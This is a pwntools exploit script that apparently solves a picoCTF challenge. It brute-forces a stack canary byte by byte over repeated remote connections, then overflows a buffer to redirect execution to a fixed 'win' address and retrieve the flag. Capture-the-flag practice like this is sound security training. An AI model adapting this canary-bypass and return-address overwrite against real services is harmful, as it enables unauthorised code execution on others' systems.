from pwn import *

URL  = 'saturn.picoctf.net'
PORT = 62697
FLAGFILE = 'flag.txt'


def create_flag(flag_path):
  write(flag_path, 'THIS_IS_THE_FLAG' * 4 + '\n')


create_flag(FLAGFILE)

win_addr = 0x8049336
canary_size = 4
canary = b""
#for each char in canary
for i in range(canary_size):

    #for each ascii character possible
    for char in string.printable:

        p = remote(URL, PORT)
        
        #program prompts for size
        p.sendlineafter(b"> ", b"%d" % (64 + i + 1))
        
        PAYLOAD = (b'1' * 64)
        #canary overwrite
        PAYLOAD += canary + char.encode()

        p.sendlineafter(b"> ", PAYLOAD)

        mesg = p.recvline()

        print(mesg)

        if b"Now Where's the Flag" in mesg:
            canary += char.encode()
            break
        p.close()

print(canary)

p = remote(URL, PORT)
PAYLOAD += b"1" * 16
PAYLOAD += p32(win_addr)
p.sendlineafter(b"> ", b"%d" % len(PAYLOAD))
p.sendlineafter(b"> ", PAYLOAD)
mesg = p.recvall()
print(mesg)